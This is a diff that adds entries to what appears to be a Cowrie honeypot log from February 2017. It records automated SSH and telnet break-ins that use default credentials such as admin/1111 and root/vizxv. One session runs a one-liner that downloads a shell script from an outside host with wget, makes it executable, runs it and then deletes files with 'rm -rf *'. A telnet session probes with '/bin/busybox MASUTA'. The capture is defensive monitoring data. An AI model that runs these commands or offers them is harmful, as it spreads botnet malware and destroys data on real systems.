@@ -2966,3 +2966,67 @@
 2017-02-18T23:43:47+0000 [CowrieTelnetTransport,6893,110.78.138.119] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
 	]
 2017-02-18T23:43:47+0000 [CowrieTelnetTransport,6893,110.78.138.119] Connection lost after 105 seconds
+2017-02-18T23:44:06+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 210.94.133.54:45812 (10.8.41.81:2222) [session: 48662bcf]
+2017-02-18T23:44:06+0000 [HoneyPotSSHTransport,15963,210.94.133.54] Remote SSH version: SSH-2.0-paramiko_1.7.5
+2017-02-18T23:44:06+0000 [HoneyPotSSHTransport,15963,210.94.133.54] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-02-18T23:44:06+0000 [HoneyPotSSHTransport,15963,210.94.133.54] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-18T23:44:06+0000 [HoneyPotSSHTransport,15963,210.94.133.54] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-18T23:44:07+0000 [HoneyPotSSHTransport,15963,210.94.133.54] NEW KEYS
+2017-02-18T23:44:07+0000 [HoneyPotSSHTransport,15963,210.94.133.54] starting service 'ssh-userauth'
+2017-02-18T23:44:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15963,210.94.133.54] 'admin' trying auth 'password'
+2017-02-18T23:44:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15963,210.94.133.54] login attempt: 4
+2017-02-18T23:44:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15963,210.94.133.54] login return, expect: [admin/1111]
+2017-02-18T23:44:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15963,210.94.133.54] login attempt [admin/1111] succeeded
+2017-02-18T23:44:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15963,210.94.133.54] 'admin' authenticated with 'password'
+2017-02-18T23:44:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,15963,210.94.133.54] starting service 'ssh-connection'
+2017-02-18T23:44:10+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] got channel 'session' request
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] channel open
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/bin.sh; chmod 777 bin.sh; sh bin.sh; rm -rf *"
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] Opening TTY Log: log/tty/20170218-234410-48662bcf-0e.log
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://kysfag.3x.ro/bin.sh; chmod 777 bin.sh; sh bin.sh; rm -rf *
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] Command found: cd /tmp
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] Command found: cd /var/run
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] Command found: cd /mnt
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] Command found: cd /root
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] Command found: cd /
+2017-02-18T23:44:10+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,15963,210.94.133.54] Command found: wget http://kysfag.3x.ro/bin.sh
+2017-02-18T23:44:10+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://kysfag.3x.ro/bin.sh>
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] Not storing duplicate content 4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] Downloaded URL (http://kysfag.3x.ro/bin.sh) with SHA-256 4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2 to dl/4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] Command found: chmod 777 /bin.sh
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] Command found: sh /bin.sh
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev /bin.sh
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] Not storing duplicate content 4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2 to dl/4956cfbe6d27e64067cbc180c7f582e3c3b4f13d99a8ccf5b857d3c1742763f2
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170218-234410-48662bcf-0e.log after 0 seconds
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-02-18T23:44:10+0000 [HTTPPageDownloader,client] sending close 0
+2017-02-18T23:44:10+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://kysfag.3x.ro/bin.sh>
+2017-02-18T23:44:10+0000 [HoneyPotSSHTransport,15963,210.94.133.54] avatar admin logging out
+2017-02-18T23:44:10+0000 [HoneyPotSSHTransport,15963,210.94.133.54] connection lost
+2017-02-18T23:44:10+0000 [HoneyPotSSHTransport,15963,210.94.133.54] Connection lost after 4 seconds
+2017-02-18T23:44:33+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 180.218.44.113:4887 (10.8.41.81:2223) [session: TT6894]
+2017-02-18T23:44:34+0000 [CowrieTelnetTransport,6894,180.218.44.113] first time for 180.218.44.113, need: 1
+2017-02-18T23:44:34+0000 [CowrieTelnetTransport,6894,180.218.44.113] login attempt: 1
+2017-02-18T23:44:34+0000 [CowrieTelnetTransport,6894,180.218.44.113] login attempt [root/vizxv] succeeded
+2017-02-18T23:44:37+0000 [CowrieTelnetTransport,6894,180.218.44.113] Opening TTY Log: log/tty/20170218-234437-None-6894i.log
+2017-02-18T23:44:37+0000 [CowrieTelnetTransport,6894,180.218.44.113] Warning: state changed and new state returned
+2017-02-18T23:44:37+0000 [CowrieTelnetTransport,6894,180.218.44.113] Received unhandled keyID: '\x00'
+2017-02-18T23:44:37+0000 [CowrieTelnetTransport,6894,180.218.44.113] CMD: enable
+2017-02-18T23:44:37+0000 [CowrieTelnetTransport,6894,180.218.44.113] Command found: enable 
+2017-02-18T23:44:37+0000 [CowrieTelnetTransport,6894,180.218.44.113] Reading txtcmd from "txtcmds/bin/enable"
+2017-02-18T23:44:38+0000 [CowrieTelnetTransport,6894,180.218.44.113] Received unhandled keyID: '\x00'
+2017-02-18T23:44:38+0000 [CowrieTelnetTransport,6894,180.218.44.113] CMD: system
+2017-02-18T23:44:38+0000 [CowrieTelnetTransport,6894,180.218.44.113] Command not found: system
+2017-02-18T23:44:38+0000 [CowrieTelnetTransport,6894,180.218.44.113] Received unhandled keyID: '\x00'
+2017-02-18T23:44:38+0000 [CowrieTelnetTransport,6894,180.218.44.113] CMD: shell
+2017-02-18T23:44:38+0000 [CowrieTelnetTransport,6894,180.218.44.113] Command not found: shell
+2017-02-18T23:44:38+0000 [CowrieTelnetTransport,6894,180.218.44.113] Received unhandled keyID: '\x00'
+2017-02-18T23:44:39+0000 [CowrieTelnetTransport,6894,180.218.44.113] CMD: sh
+2017-02-18T23:44:39+0000 [CowrieTelnetTransport,6894,180.218.44.113] Command found: sh 
+2017-02-18T23:44:39+0000 [CowrieTelnetTransport,6894,180.218.44.113] Received unhandled keyID: '\x00'
+2017-02-18T23:44:39+0000 [CowrieTelnetTransport,6894,180.218.44.113] CMD: /bin/busybox MASUTA
+2017-02-18T23:44:39+0000 [CowrieTelnetTransport,6894,180.218.44.113] Command found: /bin/busybox MASUTA
